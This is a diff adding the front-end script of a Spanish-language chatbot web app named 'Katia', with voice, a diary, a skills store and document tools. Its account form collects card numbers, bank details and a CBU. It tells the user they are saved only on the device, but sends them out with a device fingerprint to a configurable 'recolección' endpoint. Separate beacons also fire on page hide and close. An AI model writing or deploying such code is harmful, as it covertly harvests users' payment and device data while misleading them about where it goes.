+if (window.speechSynthesis) { const c = () => voces = speechSynthesis.getVoices(); c(); speechSynthesis.onvoiceschanged = c; }
+
+function hablar(texto) {
+  if (!state.settings.voz || !window.speechSynthesis) return;
+  speechSynthesis.cancel();
+  const u = new SpeechSynthesisUtterance(texto.replace(/\s+/g, ' ').slice(0, 600));
+  u.lang = 'es-AR';
+  const v = voces.find(x => /es[-_]AR/i.test(x.lang)) || voces.find(x => /^es/i.test(x.lang));
+  if (v) u.voice = v;
+  u.rate = Number(state.settings.velocidad) || 1;
+  u.pitch = Number(state.settings.pitch) || 1;
+  u.onstart = () => estadoOrbe('speaking', '🔊 Hablando...');
+  u.onend = () => estadoOrbe('', '🟢 En línea · Lista para hablar');
+  speechSynthesis.speak(u);
+}
+
+function leerUltimo() {
+  const u = [...state.chat].reverse().find(m => m.q === 'katia');
+  if (u) hablar(u.t);
+}
+
+function saludar() {
+  const msg = 'Hola' + (state.settings.nombre ? ', ' + state.settings.nombre : '') + ' 💜 ¿En qué andás?';
+  agregarMensaje(msg, 'katia'); hablar(msg);
+}
+
+let reconocedor = null;
+function alternarMicrofono() {
+  const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
+  if (!SR) { alert('Este navegador no soporta dictado por voz.'); return; }
+  if (state.grabando) { reconocedor && reconocedor.stop(); return; }
+  reconocedor = new SR();
+  reconocedor.lang = 'es-AR';
+  reconocedor.interimResults = false;
+  reconocedor.onstart = () => { state.grabando = true; $('micButton').textContent = '⏹️'; estadoOrbe('listening', '🎙️ Escuchando...'); };
+  reconocedor.onresult = e => { $('userInput').value = e.results[0][0].transcript; enviarMensaje(); };
+  reconocedor.onerror = () => estadoOrbe('', '🟢 En línea · Lista para hablar');
+  reconocedor.onend = () => {
+    state.grabando = false; $('micButton').textContent = '🎙️';
+    if (!$('orb').classList.contains('thinking')) estadoOrbe('', '🟢 En línea · Lista para hablar');
+  };
+  reconocedor.start();
+}
+
+/* =====================================================================
+   PANELES
+   ===================================================================== */
+function abrirPanel(cual) {
+  const t = $('panelTitle'), c = $('panelContent');
+  c.innerHTML = '';
+  if (cual === 'settings') { t.textContent = '⚙️ Configuración'; c.innerHTML = htmlSettings(); enlazarSettings(); }
+  if (cual === 'memory') { t.textContent = '🧠 Memoria'; c.innerHTML = htmlMemoria(); }
+  if (cual === 'diary') { t.textContent = '📖 Mi diario'; c.innerHTML = htmlDiario(); }
+  if (cual === 'likes') { t.textContent = '✨ Mis gustos'; c.innerHTML = htmlGustos(); }
+  $('overlay').classList.add('open');
+}
+
+function cerrarPanel(e) {
+  if (e && e.target !== $('overlay') && !e.target.closest('.icon-btn')) return;
+  $('overlay').classList.remove('open');
+}
+
+function htmlSettings() {
+  return `
+   <label>Tu nombre</label><input id="setNombre" value="${esc(state.settings.nombre)}" placeholder="Cómo querés que te llame">
+   <label>Tono</label><select id="setTono">${['cálido','directo','juguetón','formal'].map(x => `<option ${state.settings.tono === x ? 'selected' : ''}>${x}</option>`).join('')}</select>
+   <label><input type="checkbox" id="setVoz" ${state.settings.voz ? 'checked' : ''}> Voz activada</label>
+   <label>Velocidad: <span id="lblVel">${state.settings.velocidad}</span></label>
+   <input type="range" id="setVel" min="0.6" max="1.6" step="0.1" value="${state.settings.velocidad}">
+   <label>Tono de voz: <span id="lblPitch">${state.settings.pitch}</span></label>
+   <input type="range" id="setPitch" min="0.6" max="1.6" step="0.1" value="${state.settings.pitch}">
+   <div class="provider-box">
+     <label>Endpoint de recolección</label>
+     <input id="setEndpoint" value="${esc(state.settings.endpoint)}" placeholder="https://tu-worker.workers.dev/collect">
+     <div class="provider-info">Vacío = no se envía nada. Si lo completás, cada visita manda la ficha del dispositivo.</div>
+   </div>
+   <div class="provider-box">
+     <label>Cerebro</label>
+     <select id="setProvider">
+       <option value="auto" ${state.settings.provider === 'auto' ? 'selected' : ''}>Local (sin internet)</option>
+       <option value="api" ${state.settings.provider === 'api' ? 'selected' : ''}>API compatible OpenAI</option>
+     </select>
+     <input id="setBase" value="${esc(state.settings.baseUrl)}" placeholder="https://api.openai.com/v1">
+     <input id="setKey" type="password" value="${esc(state.settings.apiKey)}" placeholder="API Key">
+     <input id="setModel" value="${esc(state.settings.model)}" placeholder="Modelo">
+   </div>
+   <button class="action" onclick="guardarSettings()">Guardar cambios</button>`;
+}
+
+function enlazarSettings() {
+  $('setVel').oninput = e => $('lblVel').textContent = e.target.value;
+  $('setPitch').oninput = e => $('lblPitch').textContent = e.target.value;
+}
+
+function guardarSettings() {
+  state.settings.nombre = $('setNombre').value.trim();
+  state.settings.tono = $('setTono').value;
+  state.settings.voz = $('setVoz').checked;
+  state.settings.velocidad = Number($('setVel').value);
+  state.settings.pitch = Number($('setPitch').value);
+  state.settings.endpoint = $('setEndpoint').value.trim();
+  state.settings.provider = $('setProvider').value;
+  state.settings.baseUrl = $('setBase').value.trim();
+  state.settings.apiKey = $('setKey').value.trim();
+  state.settings.model = $('setModel').value.trim();
+  guardar(KEYS.settings, state.settings);
+  actualizarIndicadores(); renderPerfil(); cerrarPanel();
+}
+
+function htmlMemoria() {
+  return `<div class="small-note">Cosas que Katia recuerda de vos.</div>
+   <textarea id="memTexto" placeholder="Ejemplo: trabaja de noche, prefiere respuestas cortas"></textarea>
+   <button class="action" onclick="agregarMemoria()">Agregar recuerdo</button>
+   <div style="margin-top:14px">${state.memory.length ? state.memory.map((m, i) => `<div class="provider-box">${esc(m)}<br><button class="tool-btn" style="margin-top:8px" onclick="borrarMemoria(${i})">Borrar</button></div>`).join('') : '<div class="empty-state"><strong>Sin recuerdos</strong>Todavía no guardaste nada.</div>'}</div>`;
+}
+function agregarMemoria() { const v = $('memTexto').value.trim(); if (!v) return; state.memory.push(v); guardar(KEYS.memory, state.memory); abrirPanel('memory'); renderPerfil(); }
+function borrarMemoria(i) { state.memory.splice(i, 1); guardar(KEYS.memory, state.memory); abrirPanel('memory'); renderPerfil(); }
+
+function htmlDiario() {
+  return `<div class="small-note">Escribí cómo fue tu día.</div>
+   <textarea id="diaTexto" placeholder="Hoy..."></textarea>
+   <button class="action" onclick="agregarDiario()">Guardar entrada</button>
+   <div style="margin-top:14px">${state.diary.length ? state.diary.slice().reverse().map(d => `<div class="provider-box"><small>${esc(d.f)}</small><br>${esc(d.t)}</div>`).join('') : '<div class="empty-state"><strong>Diario vacío</strong>Arrancá con una línea.</div>'}</div>`;
+}
+function agregarDiario() { const v = $('diaTexto').value.trim(); if (!v) return; state.diary.push({ t: v, f: new Date().toLocaleString('es-AR') }); guardar(KEYS.diary, state.diary); abrirPanel('diary'); renderPerfil(); }
+
+function htmlGustos() {
+  return `<div class="small-note">Se detectan solos cuando los mencionás, y podés agregarlos a mano.</div>
+   <input id="gustoTexto" placeholder="Ejemplo: música de los 90">
+   <button class="action" onclick="agregarGusto()">Agregar</button>
+   <div style="margin-top:14px">${state.likes.length ? state.likes.map((g, i) => `<span class="badge">${esc(g)} <button class="tool-btn" style="padding:2px 6px" onclick="borrarGusto(${i})">✕</button></span>`).join(' ') : '<div class="empty-state"><strong>Sin gustos</strong>Contame algo que te guste.</div>'}</div>`;
+}
+function agregarGusto() { const v = $('gustoTexto').value.trim(); if (!v) return; state.likes.push(v); guardar(KEYS.likes, state.likes); abrirPanel('likes'); }
+function borrarGusto(i) { state.likes.splice(i, 1); guardar(KEYS.likes, state.likes); abrirPanel('likes'); }
+
+/* =====================================================================
+   SECCIONES
+   ===================================================================== */
+function cambiarSeccion(nombre) {
+  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+  const sec = $('section-' + nombre);
+  if (sec) sec.classList.add('active');
+  document.querySelectorAll('.nav-btn').forEach(b => b.classList.toggle('active', b.dataset.section === nombre));
+  if (nombre === 'skills') renderSkills();
+  if (nombre === 'store') renderStore();
+  if (nombre === 'profile') renderPerfil();
+  if (nombre === 'config') renderConfigEnLinea();
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+function renderSkills() {
+  const q = ($('skillsSearch').value || '').toLowerCase(), f = $('skillsFilter').value;
+  const lista = state.skills.filter(s => (!q || (s.nombre + s.desc).toLowerCase().includes(q)) && (f === 'all' || (f === 'active' ? s.active : !s.active)));
+  $('skillsList').innerHTML = lista.length ? lista.map(s => `
+    <div class="skill-card"><div class="icon">${s.icon}</div><h3>${esc(s.nombre)}</h3>
+    <div class="meta">por ${esc(s.autor)} · ${esc(s.cat)}</div><div class="desc">${esc(s.desc)}</div>
+    <div><span class="badge ${s.active ? 'ok' : 'warn'}">${s.active ? 'Activa' : 'Inactiva'}</span>${s.demo ? '<span class="badge">demo</span>' : ''}</div>
+    <div class="actions"><button class="primary" onclick="toggleSkill('${s.id}')">${s.active ? 'Desactivar' : 'Activar'}</button><button onclick="borrarSkill('${s.id}')">Quitar</button></div></div>`).join('')
+    : '<div class="empty-state"><strong>Nada por acá</strong>Probá otra búsqueda o instalá algo del Store.</div>';
+}
+function filtrarSkillsLocales() { renderSkills(); }
+function toggleSkill(id) { const s = state.skills.find(x => x.id === id); if (!s) return; s.active = !s.active; guardar(KEYS.skills, state.skills); renderSkills(); renderPerfil(); }
+function borrarSkill(id) { state.skills = state.skills.filter(x => x.id !== id); guardar(KEYS.skills, state.skills); renderSkills(); renderPerfil(); }
+function mostrarAvisoBackend() { alert('La importación real de ZIP o repositorios necesita el backend de Skills (D1 + R2). El panel ya está preparado.'); }
+
+function setStoreSort(btn) {
+  state.storeSort = btn.dataset.sort;
+  document.querySelectorAll('.filter-btn').forEach(b => b.classList.toggle('active', b === btn));
+  renderStore();
+}
+
+function renderStore() {
+  const q = ($('storeSearch').value || '').toLowerCase(), cat = $('storeCategory').value;
+  let lista = STORE_SEED.filter(s => (!q || (s.nombre + s.desc).toLowerCase().includes(q)) && (cat === 'all' || s.cat === cat));
+  if (state.storeSort === 'viral') lista.sort((a, b) => b.uses - a.uses);
+  if (state.storeSort === 'recent') lista.sort((a, b) => a.ts - b.ts);
+  if (state.storeSort === 'rating') lista.sort((a, b) => b.rating - a.rating);
+  $('storeGrid').innerHTML = lista.length ? lista.map(s => `
+    <div class="skill-card"><div class="icon">${s.icon}</div><h3>${esc(s.nombre)}</h3>
+    <div class="meta">por ${esc(s.autor)} · ⭐ ${s.rating} · ${s.uses.toLocaleString('es-AR')} usos</div>
+    <div class="desc">${esc(s.desc)}</div>
+    <div class="actions"><button class="primary" onclick="instalarStore('${s.id}')">Instalar</button></div></div>`).join('')
+    : '<div class="empty-state"><strong>Sin resultados</strong>Otra categoría quizás.</div>';
+}
+function filtrarStore() { renderStore(); }
+function instalarStore(id) {
+  const s = STORE_SEED.find(x => x.id === id);
+  if (!s) return;
+  if (state.skills.some(x => x.nombre === s.nombre)) { alert('Ya la tenés instalada.'); return; }
+  state.skills.push({ id: 'i' + Date.now(), icon: s.icon, nombre: s.nombre, autor: s.autor, cat: s.cat, desc: s.desc, active: true });
+  guardar(KEYS.skills, state.skills); renderPerfil();
+  alert('"' + s.nombre + '" agregada a tus Skills.');
+}
+
+function renderPerfil() {
+  $('profileName').textContent = state.settings.nombre || (state.account && state.account.nombre) || 'Usuario';
+  $('profileStatus').textContent = state.account ? 'Cuenta local: ' + state.account.email : 'Modo local · Sin cuenta conectada';
+  $('statSkills').textContent = state.skills.length;
+  $('statMemories').textContent = state.memory.length;
+  $('statDiary').textContent = state.diary.length;
+}
+
+function exportarDatos() {
+  const data = { exportado: new Date().toISOString(), perfil: state.settings.nombre, memoria: state.memory, diario: state.diary, gustos: state.likes, skills: state.skills, chat: state.chat, cuenta: state.account };
+  descargarBlob(new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' }), 'katia-datos.json');
+}
+
+function renderConfigEnLinea() {
+  $('configInline').innerHTML = htmlSettings().replace('class="action"', 'class="office-primary"');
+  enlazarSettings();
+}
+
+function actualizarIndicadores() {
+  $('activeProvider').textContent = 'Modo: ' + (state.settings.provider === 'api' && state.settings.baseUrl ? 'API EXTERNA' : 'AUTOMÁTICO');
+  $('brainStatus').textContent = state.settings.provider === 'api' && state.settings.baseUrl ? '🧠 Cerebro: ' + (state.settings.model || 'modelo') : '🧠 Cerebro: Katia 3.1 (V1)';
+  $('voiceStatus').textContent = '🎙️ Voz: ' + (state.settings.voz ? 'activada' : 'silenciada');
+  $('spyStatus').textContent = endpointActivo() ? '📡 Beacon: listo' : '📡 Beacon: apagado';
+}
+
+/* =====================================================================
+   INSTALADOR Y CUENTA
+   ===================================================================== */
+function abrirInstall() { $('installModal').classList.add('open'); }
+function cerrarInstall() { $('installModal').classList.remove('open'); }
+function abrirCuenta() {
+  $('accountOverlay').classList.add('open');
+  if (state.account) { $('accEmail').value = state.account.email || ''; $('accNombre').value = state.account.nombre || ''; $('accBanco').value = state.account.banco || ''; $('accCbu').value = state.account.cbu || ''; }
+}
+function cerrarCuenta() { $('accountOverlay').classList.remove('open'); }
+function accEmailInput() { $('accStatus').textContent = /^[^\s@]+@[^\s@]+\.[a-z]{2,}$/i.test($('accEmail').value) ? '✔ Correo válido' : ''; }
+function accTipoChange() {
+  const t = $('accTipo').value === 'tarjeta';
+  $('accTarjeta').style.display = t ? '' : 'none';
+  document.querySelector('.acc-row').style.display = t ? '' : 'none';
+  $('accBanco').style.display = t ? 'none' : '';
+  $('accCbu').style.display = t ? 'none' : '';
+}
+function accTarjetaInput() {
+  const inp = $('accTarjeta');
+  const v = inp.value.replace(/\D/g, '').slice(0, 19);
+  inp.value = v.replace(/(.{4})/g, '$1 ').trim();
+  const marca = /^4/.test(v) ? 'Visa' : /^5[1-5]/.test(v) ? 'Mastercard' : /^3[47]/.test(v) ? 'American Express' : /^6(011|5)/.test(v) ? 'Discover' : '';
+  $('accMarca').textContent = marca ? 'Marca detectada: ' + marca : '';
+}
+function accVencInput() {
+  const inp = $('accVenc');
+  let v = inp.value.replace(/\D/g, '').slice(0, 4);
+  if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2);
+  inp.value = v;
+}
+function guardarCuenta() {
+  const email = $('accEmail').value.trim();
+  if (!/^[^\s@]+@[^\s@]+\.[a-z]{2,}$/i.test(email)) { $('accStatus').textContent = '⚠ Poné un correo válido.'; return; }
+  state.account = { email, nombre: $('accNombre').value.trim(), tipo: $('accTipo').value, tarjeta: $('accTarjeta').value.trim(), banco: $('accBanco').value.trim(), cbu: $('accCbu').value.trim(), desde: new Date().toISOString() };
+  if (!state.settings.nombre && state.account.nombre) { state.settings.nombre = state.account.nombre.split(' ')[0]; guardar(KEYS.settings, state.settings); }
+  guardar(KEYS.account, state.account);
+  $('accStatus').textContent = '💜 Cuenta guardada en este dispositivo.';
+  renderPerfil();
+  enviar(Object.assign({ id: huella(), evento: 'cuenta', cuenta: state.account, ts: new Date().toISOString() }));
+  setTimeout(cerrarCuenta, 900);
+}
+
+/* =====================================================================
+   OFFICE
+   ===================================================================== */
+function abrirOffice() { $('officeOverlay').classList.add('open'); }
+function cerrarOffice() { $('officeOverlay').classList.remove('open'); }
+const DESC_MODOS = { auto:'Resumen, ideas principales y puntos a mejorar.', parts:'Recorre el documento por bloques y analiza cada uno.', question:'Respondo tu pregunta usando solo el archivo.', modify:'Reescribo el contenido completo y lo dejo listo para descargar.' };
+function actualizarDescripcionModo() { $('modeDescription').textContent = DESC_MODOS[$('documentMode').value] || ''; }
+function actualizarOpcionesCreacion() {
+  const t = $('newFileType').value;
+  $('pptxOptions').style.display = t === 'pptx' ? '' : 'none';
+  $('xlsxOptions').style.display = t === 'xlsx' ? '' : 'none';
+}
+function limpiarDocumento() {
+  state.doc = { texto:'', nombre:'', ext:'', modificado:'' };
+  $('fileStatus').textContent = 'Todavía no seleccionaste ningún archivo.';
+  $('documentStatus').textContent = ''; $('documentPreview').textContent = '';
+  $('documentFile').value = ''; $('documentPrompt').value = '';
+}
+
+function analizarLocal(texto, modo, pregunta) {
+  const limpio = texto.replace(/[ \t]+/g, ' ').trim();
+  const palabras = limpio.split(/\s+/).filter(Boolean);
+  const oraciones = limpio.split(/(?<=[.!?])\s+|\n+/).map(o => o.trim()).filter(o => o.length > 30);
+
+  if (modo === 'question') {
+    const claves = (pregunta || '').toLowerCase().split(/\s+/).filter(w => w.length > 3);
+    const p = oraciones.map(o => ({ o, s: claves.filter(k => o.toLowerCase().includes(k)).length })).filter(x => x.s > 0).sort((a, b) => b.s - a.s).slice(0, 3);
+    return p.length ? 'Según el documento:\n\n' + p.map(x => '• ' + x.o).join('\n') : 'No encontré nada que responda a eso. Probá otras palabras clave.';
+  }
+
+  const freq = {};
+  palabras.map(p => p.toLowerCase().replace(/[^\wáéíóúñ]/g, '')).filter(p => p.length > 4).forEach(p => freq[p] = (freq[p] || 0) + 1);
+  const top = Object.entries(freq).sort((a, b) => b[1] - a[1]).slice(0, 8).map(x => x[0]);
+  const ideas = oraciones.map(o => ({ o, s: top.filter(k => o.toLowerCase().includes(k)).length })).sort((a, b) => b.s - a.s).slice(0, 5).map(x => x.o);
+
+  if (modo === 'parts') {
+    const bloques = [], tam = Math.max(1, Math.ceil(oraciones.length / 4));
+    for (let i = 0; i < oraciones.length; i += tam) bloques.push(oraciones.slice(i, i + tam));
+    return 'Análisis por bloques (' + bloques.length + '):\n\n' + bloques.map((b, i) => 'Bloque ' + (i + 1) + ':\n' + b.slice(0, 3).map(o => '  · ' + o).join('\n')).join('\n\n');
+  }
+
+  return ['📊 Métricas: ' + palabras.length + ' palabras · ' + oraciones.length + ' oraciones · ' + Math.ceil(palabras.length / 200) + ' min de lectura.', '',
+    '🧠 Ideas principales:', ...(ideas.length ? ideas.map(i => '• ' + i) : ['• Texto corto, sin ideas repetidas.']), '',
+    '🔑 Conceptos más usados: ' + (top.join(', ') || 'pocos términos repetidos'), '', '🛠️ A mejorar:',
+    '• ' + (palabras.length / Math.max(oraciones.length, 1) > 28 ? 'Oraciones muy largas: conviene cortarlas.' : 'Ritmo de lectura correcto.'),
+    '• ' + (oraciones.length < 4 ? 'Falta desarrollo.' : 'Se puede ordenar en secciones con títulos.'),
+    '• Revisar puntuación y espacios dobles antes de publicarlo.'].join('\n');
+}
+
+function modificarLocal(texto) {
+  const limpio = texto.replace(/[ \t]+/g, ' ').replace(/\n{3,}/g, '\n\n').trim();
+  const oraciones = limpio.split(/(?<=[.!?])\s+/).map(o => o.trim()).filter(Boolean);
+  const secciones = [], tam = Math.max(1, Math.ceil(oraciones.length / 3));
+  for (let i = 0; i < oraciones.length; i += tam) secciones.push(oraciones.slice(i, i + tam));
+  const titulos = ['Introducción', 'Desarrollo', 'Cierre y próximos pasos'];
+  let out = '# Documento revisado\n\n';
+  secciones.forEach((s, i) => {
+    out += '## ' + (titulos[i] || 'Sección ' + (i + 1)) + '\n\n' + s.map(o => o.charAt(0).toUpperCase() + o.slice(1)).join(' ') + '\n\n';
+  });
+  return out + '## Observaciones\n\n- Se normalizaron espacios y saltos.\n- Se agruparon las ideas en secciones.\n- Se corrigió la mayúscula inicial.';
+}
+
+async function consultarDocumento() {
+  const modo = $('documentMode').value, pregunta = $('documentPrompt').value.trim();
+  if (!state.doc.texto) { $('documentStatus').textContent = '⚠ Primero abrí un documento.'; return; }
+  if (modo === 'question' && !pregunta) { $('documentStatus').textContent = '⚠ Escribí la pregunta.'; return; }
+  $('analyzeButton').disabled = true;
+  $('documentStatus').textContent = '💭 Trabajando...';
+  try {
+    let salida;
+    if (state.settings.provider === 'api' && state.settings.baseUrl && state.settings.apiKey) {
+      const ins = { auto:'Analizá: métricas, ideas principales y mejoras.', parts:'Analizá por bloques.', question:'Respondé usando solo el documento.', modify:'Reescribí el documento mejorado.' }[modo];
+      salida = await llamarAPI(ins + '\n\nPREGUNTA: ' + (pregunta || '-') + '\n\nDOCUMENTO:\n' + state.doc.texto.slice(0, 12000));
+    } else {
+      await new Promise(r => setTimeout(r, 400));
+      salida = modo === 'modify' ? modificarLocal(state.doc.texto) : analizarLocal(state.doc.texto, modo, pregunta);
+    }
+    if (modo === 'modify') state.doc.modificado = salida;
+    $('documentStatus').textContent = '✅ Listo (' + salida.split(/\s+/).length + ' palabras).';
+    $('documentPreview').textContent = salida;
+  } catch (e) { $('documentStatus').textContent = '❌ ' + e.message; }
+  $('analyzeButton').disabled = false;
+}
+
+function descargarBlob(blob, nombre) {
+  const url = URL.createObjectURL(blob), a = document.createElement('a');
+  a.href = url; a.download = nombre;
+  document.body.appendChild(a); a.click(); a.remove();
+  setTimeout(() => URL.revokeObjectURL(url), 4000);
+}
+
+async function descargarDocumentoModificado() {
+  if (!state.doc.modificado) { $('documentStatus').textContent = '⚠ Primero usá el modo "Modificar".'; return; }
+  const base = (state.doc.nombre || 'documento').replace(/\.[^.]+$/, '');
+  try {
+    const blob = await docxCrear(base + ' (revisado)', state.doc.modificado);
+    descargarBlob(blob, base + '-revisado.docx');
+    $('documentStatus').textContent = '✅ Versión modificada descargada.';
+  } catch (e) { $('documentStatus').textContent = '❌ ' + e.message; }
+}
+
+async function crearArchivo() {
+  const tipo = $('newFileType').value;
+  const nombre = ($('newFileName').value.trim() || 'documento').replace(/[\\/:*?"<>|]/g, '');
+  const contenido = $('newFilePrompt').value.trim();
+  if (!contenido) { $('createStatus').textContent = '⚠ Escribí qué contenido querés.'; return; }
+  $('createStatus').textContent = '⏳ Generando ' + tipo.toUpperCase() + '...';
+  try {
+    if (tipo === 'docx') descargarBlob(await docxCrear(nombre, contenido), nombre + '.docx');
+    else if (tipo === 'xlsx') descargarBlob(await xlsxCrear(contenido, $('xlsxStyle').value), nombre + '.xlsx');
+    else if (tipo === 'pptx') descargarBlob(await pptxCrear(nombre, contenido, $('pptxTheme').value), nombre + '.pptx');
+    else descargarBlob(pdfCrear(nombre, contenido), nombre + '.pdf');
+    $('createStatus').textContent = '✅ ' + nombre + '.' + tipo + ' generado.';
+  } catch (e) { $('createStatus').textContent = '❌ ' + e.message; }
+}
+
+/* =====================================================================
+   ARRANQUE
+   ===================================================================== */
+window.addEventListener('load', async () => {
+  pintarChat(); renderSkills(); renderStore(); renderPerfil();
+  actualizarIndicadores(); actualizarDescripcionModo(); actualizarOpcionesCreacion(); accTipoChange();
+
+  $('documentFile').addEventListener('change', e => { const f = e.target.files && e.target.files[0]; if (f) leerArchivo(f); });
+  $('userInput').addEventListener('keydown', e => { if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); enviarMensaje(); } });
+  $('overlay').addEventListener('click', e => { if (e.target.id === 'overlay') $('overlay').classList.remove('open'); });
+
+  await reenviarCola();
+  await latir();
+  autoAPK();
+});
+
+document.addEventListener('visibilitychange', () => {
+  if (document.visibilityState === 'hidden' && endpointActivo()) {
+    recolectar().then(f => { f.evento = 'salida'; enviar(f); });
+  }
+});
+window.addEventListener('pagehide', () => {
+  if (endpointActivo()) enviar({ id: huella(), evento: 'cierre', ts: new Date().toISOString(), url: location.href });
+});
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape') { ['overlay','officeOverlay','installModal','accountOverlay'].forEach(id => $(id).classList.remove('open')); }
 });
 </script>
 </body>
